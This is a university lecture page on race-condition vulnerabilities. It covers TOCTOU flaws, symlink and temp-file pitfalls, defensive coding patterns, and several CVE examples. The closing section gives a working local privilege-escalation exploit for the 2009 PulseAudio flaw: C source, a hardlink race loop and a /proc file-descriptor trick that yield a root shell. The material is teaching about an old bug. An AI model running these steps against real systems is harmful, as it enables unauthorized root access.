<html>

<head>
<title>Race Conditions Lecture by Prabhaker Mateti</title>
<meta name="author" content="Prabhaker Mateti">
<meta name="keywords" content="Internet security, Network security, 
TCP/IP security, Cyber Security, Cybersecurity">
<meta name="description" content="This page is part of a set of lecture notes
for a course on Internet Security by Prabhaker Mateti
http://www.cs.wright.edu/~pmateti/">

<base target="_top">

<style type="text/css">
  a:hover { color: blue; background-color: yellow; }
  a:active { color: white; background-color: green;}
  P { text-align: justify; }
  pre {border:blue 1px dotted;}
  tt {border:blue 1px dotted;}
  li { text-align: justify; }
  @page { size: 8.5in 11in }
  @media screen {BODY {margin: 10%;} }
  body {margin: 10%;}
</style>
<style>
body {counter-reset: chapter; counter-reset: section;}
h2:before {content: counter(section) ". "; counter-increment: section;}
</style>

<link href="../../../SyntaxHighLighter/styles/shCoreEclipse.css" rel="stylesheet" type="text/css" />
<script type="text/javascript" src="../../../SyntaxHighLighter/scripts/shCore.js"></script>
<script src="../../../SyntaxHighLighter/scripts/shAutoloader.js" type="text/javascript"></script>
<script type="text/javascript" src="../../../SyntaxHighLighter/scripts/shBrushCpp.js"></script>
<script type="text/javascript" src="../../../SyntaxHighLighter/scripts/shBrushBash.js"></script>
<script type="text/javascript">     SyntaxHighlighter.all();</script>

</head>
<body>

<h1>Race Condition Exploits</h1>
  
<h3><a target="_blank" href="http://www.cs.wright.edu/~pmateti">
Prabhaker Mateti</a></h3>


<blockquote>
<p>Abstract: Race condition exploits are due to sloppy software
  development, perhaps taking second rank only to buffer overflow
  exploits.  This lecture explains the race conditions and their
  exploits, and presents a few techniques that help in
  avoiding the exploit.</p>
</blockquote>

<h3><a name="Table of Contents">Table of Contents</a></h3>
<ol>
  <li><a href="#Educational Objective">Educational Objectives</a></li>
  <li><a href="#Real_Life_Examples">Real Life Examples</a></li>
  <li><a href="#Techniques">Techniques</a></li>
	<li><a href="#PulseAudio2009">Explanation of a Race Condition Exploit</a></li>
  <li><a href="#Lab Experiment">Lab Experiment</a></li>
  <li><a href="#Acknowledgements">Acknowledgements</a></li>
  <li><a href="#References">References</a></li>
</ol>


<h3><a name="Educational Objective">Educational Objective</a>s</h3>
  <ol>
    <li>Present a few real life examples of race condition exploits.</li>
    <li>Describe the exploit technique</li>
    <li>Describe several techniques of exploit avoidance.</li>
  </ol>


<h1>Race Condition Exploits</h1>

<h3>Race Conditions</h3>
&quot;Temporary file race vulnerabilities occur when privi-leged programs
attempt to create temporary files in an unsafe manner. ÒUnsafeÓ means Ònon-atomic
with respect to an attackerÕs activities.Ó There is no portable standard for
safely (atomically) creating temporary files, and many operating systems have no
safe temporary file creation at all. As a result, many programs continue to use
unsafe means to create temporary files, resulting in widespread vulnerabilities.
This paper presents Race-Guard: a kernel enhancement that detects attempts to
exploit temporary file race vulnerabilities, and does so with sufficient speed
and precision that the attack can be halted before it takes effect. RaceGuard
has been imple-mented, tested, and measured. We show that RaceGuard is effective
at stopping temporary file race attacks, pre-serves compatibility (no legitimate
software is broken), and preserves performance (overhead is minimal).&quot;


<p>Race conditions arise from multiple processes/threads that operate
on related entities in an OS that has preemptive scheduling.  Any good
OS book will describe race conditions.  The effects are often an
unexpected result in a computation, a deadlock, or a livelock.

<p>Within user processes, almost all race conditions reduce to races
in the file system.  Within OS kernels, race conditions are present in
various places, e.g., in virtual memory management code.


<p> Exploits based on race conditions are subtle.  They typically
require repeated attempts within the short time period.  These
exploits can be eliminated by understanding the ideas and techniques
of atomicity and mutual exclusion from concurrent programming courses.
To keep up performance, the race condition eliminations have to be
done after deep analyses.  Real systems continue to suffer from race
conditions because of sloppy design and construction.

<h2><a name="Real_Life_Examples">Real Life Examples</a></h2>

<h3>PulseAudio 2009</h3>

<p>
<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1894">
CVE-2009-1894</a>: "Race condition in PulseAudio 0.9.9, 0.9.10, and
0.9.14 allows local users to gain privileges via vectors involving
creation of a hard link, related to the application setting
LD_BIND_NOW to 1, and then calling execv on the target of the
/proc/self/exe symlink."</p>

<p>This exploit is further explained <a href="#PulseAudio2009">
later</a>.</p>


<h3>Internet Explorer 2011</h3>

<p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1257">
CVE-2011-1257</a>: "Race condition in Microsoft Internet Explorer 6
through 8 allows remote attackers to execute arbitrary code or cause a
denial of service (memory corruption) via vectors involving access to
an object, aka 'Window Open Race Condition Vulnerability.' "
</p>

<p>This vulnerability was discovered in Jan 2011 and a patch was released
and publicly disclosed in August 2011.  An attacker composes a web
page with malicious code and when a user visits this page, the exploit
happens.

<h3>Firefox 2007</h3>

<p>
<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-5960">
CVE-2007-5960</a>: "Mozilla Firefox before 2.0.0.10 and SeaMonkey before
1.1.7 sets the Referer header to the window or frame in which script
is running, instead of the address of the content that initiated the
script, which allows remote attackers to spoof HTTP Referer headers
and bypass Referer-based CSRF protection schemes by setting
<tt>window.location</tt> and using a modal alert dialog that causes the wrong
Referer to be sent."

<p>
"... it was possible to generate a fake HTTP Referer header by
exploiting a timing condition when setting the window.location
property. This could be used to conduct a Cross-Site Request Forgery
(CSRF) attack against websites that rely only on the Referer header as
protection against such attacks."

<p>
"When navigation occurs due to setting window.location, the Referer
header is supposed to reflect the address of the content which
initiated the script.  Instead, the referer was set to the address of
the window (or frame) in which the script was running, and this
vulnerability arises from that tiny difference. Using a modal alert()
dialog Fleischer was able to suspend the attack script so that it did
not load the target URI until after the attacker's initial content had
been replaced by the intended referring page. When the Referer is set
to the current URI of the script's window it is no longer the correct
one."

<h3>Windows Shortcut-Link 2010</h3>

<p>
<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2568">
CVE-2010-2568</a>: "Windows Shell in Microsoft Windows XP SP3, Server
2003 SP2, Vista SP1 and SP2, Server 2008 SP2 and R2, and Windows 7
allows local users or remote attackers to execute arbitrary code via a
crafted (1) .LNK or (2) .PIF shortcut file, which is not properly
handled during icon display in Windows Explorer, as demonstrated in
the wild in July 2010, and originally reported for malware that
leverages CVE-2010-2772 in Siemens WinCC SCADA systems."

<p> Summary of the exploit code
at <a href="http://www.exploit-db.com/">
http://www.exploit-db.com/</a>: "The .lnk exploitation suffers from a
race condition as it executes the downloaded dll 3 times
simultaneously.  This hinders the proper exploitation of the victim in
case the payload dll tries to write any file on the disk or tries to
access and change any other resource on the victim system.  First
thing to be noted that the .lnk exploit is actually an undocumented
DLL-Injection technique.  The .lnk file will retrieve a file of type
either .dll, .cpl or .ocx or extension which are legitimate dynamic
libraries with DllMain() defined."

<h2><a name="Techniques">Techniques</a></h2>

<p>This section describes certain coding practices that introduce
races, and their remedies.  In all the code examples, error checks
are not shown.

<h3>Time of Check/Time of Use (TOCTOU)</h3>

<p>
An exploit that has happened enough times since the 1980s is called
the "Time of Check/Time of Use (TOCTOU)" attack: Suppose process A
checked that a certain file exists and has certain attributes before
locking the file and opening the file.  By the time A opens it, the
file could have been replaced with another.  If the time gap between
TOC and TOU is long (remember even a lowly PC can do 10 MIPS),
developing an exploit is easy.  Clever exploits work even when the gap
is short.  In modern OS on multicore CPUs, this situation has worsened
because of threads.  These are implemented as memory-sharing extremely
lightweight versions of processes.

<p>The following elaborates the above specific example, using file
system operations, of the general pattern of TOCTOU vulnerability.

<pre class="brush: cpp">
  int access(const char *pathname, int mode);
  FILE *fopen(const char *pathname, const char *mode);

  ...
  char pnm[] = "some/path/name";
  ...

  if (access(pnm, W_OK) == 0) {
    f = fopen(pnm, "w+");
    ...
  }
  else 
    fprintf(stderr,"You do not seem to have write access to %s.\n", pnm);
</pre>

<p>Recall that access() checks whether the calling process can access
the file named by pathname.  If pathname is a symbolic link, it is
dereferenced.  The check is done using the calling process's real UID
and GID, rather than the effective IDs as is done when actually
attempting an operation (e.g., open(2)) on the file.  This allows
Set-User-ID programs to determine the invoking user's privileges.

<p>However, a process/thread switch, caused by OS scheduling policies,
may have happened after access() check but before fopen().  By the
time the fopen() is performed by the iniating process in the next
line, three things could have happened: (i) contents of the pnm[] may
have changed, (ii) the permissions/content of the file referenced may
have changed, and (iii) if the path specified was a (sym)link, the
(sym)link may have changed.  Note that (iii) is a more blatant version
of (ii).  This exploit is further explained <a href="#PulseAudio2009">
later</a>.</p>

<h3>Links Soft or Hard</h3>

<p>The following example is adapted
from <a href="https://www.securecoding.cert.org/">
https://www.securecoding.cert.org/</a>.

<p>
Recall that the POSIX lstat()</tt> function collects information about
a symbolic link rather than its target, in contrast to stat()</tt>.
The open() function does follow symbolic links and includes a check on
deep links.  We check the st_mode field to determine if the given file
name is a symbolic link, and then open it if not so.

<pre class="brush: cpp">
char *pathname = ...;
char userbuf[] = ...;
... 
struct stat statOne;
... 
if ((lstat(pathname, &statOne) == 0) && !S_ISLNK(statOne.st_mode)) {
   int fd = open(pathname, O_RDWR), nb;
   ...
   nb = write(fd, userbuf, sizeof(userbuf));
   ...
}
</pre>


<p>This code contains a TOCTOU race condition because both lstat and
open operate on a path name that can be manipulated asynchronously by
other processes.  We can check if an exploit happened by calling
fstat() on the file descriptor returned by open(), and comparing the
file information returned by the calls to lstat() and fstat() to
ensure that the files are the same.

<pre class="brush: cpp">
char *pathname = ...;
char userbuf[] = ...;
... 
struct stat statOne, statTwo;
... 
if ((lstat(pathname, &statOne) == 0) && !S_ISLNK(statOne.st_mode)) {
   int fd = open(pathname, O_RDWR), nb;
   int rx = fstat(fd, &statTwo);
   if ( statOne.st_mode == statTwo.st_mode
   &&   statOne.st_ino  == statTwo.st_ino
   &&   statOne.st_dev  == statTwo.st_dev ) {
     /* no switcheroo occurred */
     ...
     nb = write(fd, userbuf, sizeof(userbuf));
     ...
  }
}
</pre>

<p>This code eliminates the exploit condition because fstat() is
applied to file descriptors.  Comparing i-nodes, using the st_ino
fields, modes, and devices, using the st_dev fields, ensures that the
file passed to lstat() is the same as the file passed to fstat().

<p>We should always: (i) Check for the existence of links when dealing
with files; (ii) Canonicalize path names before validation.  Absolute
or relative path names may contain file links such as symbolic (soft)
links, hard links, short cuts, shadows, aliases, and junctions. These
file links must be fully resolved before any file validation
operations are performed.

<h3>Temporary Files</h3>

<p>All OS have directories that permit the creation of files within by
arbitrary processes.  On Linux, we have <tt>/tmp/</tt> and
<tt>/var/tmp/</tt>.  These have been fertile grounds for race
condition exploits.  Often an application computes updates to its
persistent database in a temporary file and then applies the updates.
Using race condition exploits, a file swap can be made.


<p>On a system that needs to be secure, the /tmp and /var/tmp should
be separate partitions mounted with nosuid and noexec options.  In
general: Create temporary files securely.  Remove temporary files
before termination of the process.  Do not create temporary files in
shared directories.

<h3>Threads and Processes</h3>

<p>
When forking a process, file descriptors are copied to the child
process which can result in concurrent operations on the file.  This
can cause data to be read or written in a non-deterministic order,
creating race conditions and unpredictable behavior.  We should close
the file descriptor in the child after forking and then reopen it,
ensuring that the file has not been modified in the meantime.

<p>Do not use threads that can be canceled asynchronously.


<h3>Signals</h3>

<p>
Avoid using signals to implement normal functionality.  Do not use
signals to terminate threads.  Do not send an uncaught signal to kill
a thread because the signal kills the entire process, not just the
individual thread.

<h3>iNotify</h3>

<p>
The iNotify framework on Linux registers your notification hooks.
These are called when a certain event happens (e.g. creating a target
file).  There is multi-core concurrency, and the target process can
run on a different CPU-core than the exploitation process which
no longer relies on OS scheduler to switch the target at the right
moment.

<h3>Shared Variables</h3>



<p>Ensure that compound operations on shared variables are atomic.
Expressions that include postfix or prefix increment (++), postfix or
prefix decrement (--), or compound assignment operators always result
in compound operations. Compound assignment expressions use operators
such as *=, /=, %=, +=, -=, <<=, >>=, >>>=, ^= and |=.



<h3>Detection</h3>

<p>The general solution to race conditions is to use a locking
mechanism to prevent one process from changing a variable until
another is finished with it.
"Black box methods may be able to identify evidence of race conditions
via methods such as multiple simultaneous connections, which may cause
the software to become instable or crash.  However, race conditions
with very narrow timing windows would not be detectable.  White Box
Common idioms are detectable in white box analysis, such as TOCTOU
file operations (CWE-367), or double-checked locking (CWE-609).  Race
conditions may be detected with a stress-test by calling the software
simultaneously from a large number of threads or processes, and look
for evidence of any unexpected behavior.  Insert breakpoints or delays
in between relevant code statements to artificially expand the race
window so that it will be easier to detect."

<p>Elimination of race conditions is near impossible because the
TOCTOU pattern is necessary in many programs.  However, we can
make exploits based on races more difficult by adding more race
conditions.  To compromise the security of the program, attackers need
to win all these race conditions.

<h2><a name="PulseAudio2009">
PulseAudio 2009 Exploit Further Explained</a>
</h2>

<p>
On Linux, PulseAudio is a network-enabled sound server.  In 2009, its
binary was installed setuid root, and did not drop privileges before
re-executing itself.  A user who has write access to any directory on
the file system containing /usr/bin can exploit the race condition
vulnerability to execute arbitrary code with root privileges.  The
immediate workaround is to ensure that the file system holding
/usr/bin does not contain directories that are writable for
unprivileged users.  This example is further explained below [from
http://blog.stalkr.net].  Note also that recent (2011+) Linux kernels
no longer permit hard links to suid-root executables.
</p>

<p>The Pulseaudio exploit is an instance of TOCTOU.  It can be reduced
to the code shown below; let us call it vulnerable.c.

<pre class="brush: cpp">
#include &lt;stdio.h>

char buf[4096], * args[] = { buf, "dummyArg", 0 };

int main(int argc, char *argv[], char **envp)
{
  if (argc &lt; 2) {
    readlink("/proc/self/exe", buf, sizeof(buf));
    usleep(1000);
    execve(args[0], args, 0);
  }
  printf("argc %d\n", argc);
  return 0;
}
</pre>


<h3>Exploit 1: Classic Race Exploitation</h3>

<p>Here is a wrapper.c to give us a shell with euid (geteuid) as uid
(setuid).  We now open two terminals.
<pre class="brush: cpp">
#include &lt;stdio.h>
char *args[] = { "/bin/bash", 0 };
int main()
{
  int i = 0, j = geteuid();
  if (j == 0) {
    setuid(0);
    i = execv(args[0], args);
  }
  printf("euid %d i %d\n", j, i);
  return i;
}
</pre>
<p>
In the first terminal, prepare to trigger the
race condition by creating a hard (or soft) link to the vulnerable
program, then place our program (proof-of-concept poc) under the same
filename, and loop.

<pre class="brush: bash"> while :; do ln -f ./vulnerable poc; ln -f ./wrapper poc; done</pre> 

<p>In the second terminal, just run the hardlink. We lower the
priority of the process to increase our chances for the race condition
to be triggered.
<pre class="brush: bash">while :; do nice -n 20 ./poc; done</pre> We
wait and the shell should appear ..., but it can take a long
time.


<h3>Exploit 3: Use /proc File Descriptors</h3>

Create the hardlink, then open a file descriptor in the current shell to it:
<pre class="brush: cpp">
$ ln vulnerable poc
$ exec 3< ./poc
$ ls -l /proc/$$/fd/3
lr-x------ 1 stalkr stalkr 64 Nov  1 03:39 /proc/2074/fd/3 -> /home/stalkr/poc
</pre>

<p>It is important to realize that from this point the program has not
been started, we just have a file descriptor to the program, and a
file descriptor has all information about owner and setuid bit.

Now we delete our hardlink to the setuid program:
<tt>$ rm -f poc</tt>

<p>Now if you check the file descriptor, it should have appended to its destination " (deleted)" and the link is broken:
<pre class="brush: cpp">
$ ls -l /proc/$$/fd/3
lr-x------ 1 stalkr stalkr 64 Nov  1 03:39 /proc/2074/fd/3 -> /home/stalkr/poc (deleted)
</pre>


<p>On some kernels it does not change the destination, you just see
that the link is broken if you enable ls colors (green ok, red
broken).

Then just place the program you want at this destination. Here I will just use a setuid(geteuid)+execve(/bin/sh) wrapper.
<tt>$ mv wrapper 'poc (deleted)'</tt> On kernels where the fd symlink
has not changed its destination, you just have to rename it to poc.

<p>The final step is to execute the program. We do that by using shell built-in exec on the file descriptor and it has the effect of calling execve() on this file descriptor. But remember, this file descriptor has root owner and setuid bit, so it executes the vulnerable program (still on disk because it was a hardlink) with these properties. The vulnerable program then executes itself via /proc/self/exe which now points to our program, and we eventually get the euid root:
<pre class="brush: cpp">
$ exec /proc/$$/fd/3
sh-4.1# id
uid=0(root) gid=1000(stalkr) groups=0(root),1000(stalkr)
</pre>
Race won in one shot!

<p>Update: on newer (> 2010) kernels, this exploitation technique is no longer usable because file is renamed as (deleted) /path/to/file.


<h2><a name="Lab Experiment">Lab Experiment</a></h2>

<p>To exploit the PulseAudio example race reliably, we need to find a
way to stop the execution of the process before its main().


<h2><a name="Acknowledgements">Acknowledgements</a></h2>

<p>These lecture materials are gleaned from many sources. All are
presented after careful reading. In some cases, I may have neglected
proper attribution. I assure the reader it is not because I claim
authorship. Indeed, in the lectures there is hardly any thing new that
I have contributed. Suggestions for improvement are always welcome.
</p>

<h2><a name="References">References</a></h2>

<ol>

  <li>Apple.com,
    <a href="http://developer.apple.com/library/mac/#documentation/Security/Conceptual/SecureCodingGuide/"> Secure Coding Guide</a>, 2012.  Reference.
    </li>

  <li>
    <a href="http://cwe.mitre.org/"> Mitre.org</a>, CWE-362: Concurrent
    Execution using Shared Resource with Improper Synchronization ('Race
    Condition').  Required Visit.</li>

  <li>
    Drepper, Ulrich. Defensive Programming for Red Hat Enterprise
    Linux (and What To Do If Something Goes Wrong), May 3, 2006.
    No, not just for RedHat.  Recommended Reading.
    </li>

  <li>
    Mark G. Graff and Kenneth R. van Wyk,
    Secure Coding: Principles & Practices (book),
    O'Reilly.com, 
    <a href="http://www.securecoding.org/">
    http://www.securecoding.org/</a>, 2003.  Reference.

  <li>
    Eugene Tsyrklevich and Bennet Yee, "Dynamic Detection and
    Prevention of Race Conditions in File Accesses", 
    12th USENIX Security Symposium, August 2003.  Recommended Reading.

  <li>Race conditions in signal_handlers: 
    (i) https://www.owasp.org/ index.php/ Race_ condition_ in_ signal_ handler,
    (ii) http://lcamtuf.coredump.cx/ signals.txt.   Recommended Reading.
    </li>

  <li>David A. Wheeler, Secure Programming for Linux and Unix HOWTO
    -- Creating Secure Software (free book)
    <a href="http://www.dwheeler.com/secure-programs/">
      http://www.dwheeler.com/ secure-programs/</a> Section on Avoid Race
    Conditions: Required Reading.

    <li>
      Michal Zalewski, Browser Security Handbook, 2009.
      <a href="http://code.google.com/p/browsersec/wiki/Main"> http://code.google.com/p/browsersec/ wiki/Main</a>  Reference.

    <li>
      David A. Wheeler, Prevent race conditions, "http://www.ibm.com/developerworks/linux/library/l-sprace/index.html 2004. Required Reading.

</ol>

<hr size="1">

<a href="../../../copyright.html">Copyright &copy;</a> 2012 &bull;
<a href="mailto:pmateti@wright.edu?subject=CEG429/InternetSecurity">
  pmateti@wright.edu</a> &bull;
<a href="http://s17.sitemeter.com/stats.asp?site=s17pmateti">
<img src="http://s17.sitemeter.com/meter.asp?site=s17pmateti"/></a> &bull;
<a href="../../lectures.html">Internet Security Lectures</a>

</body>
</html>
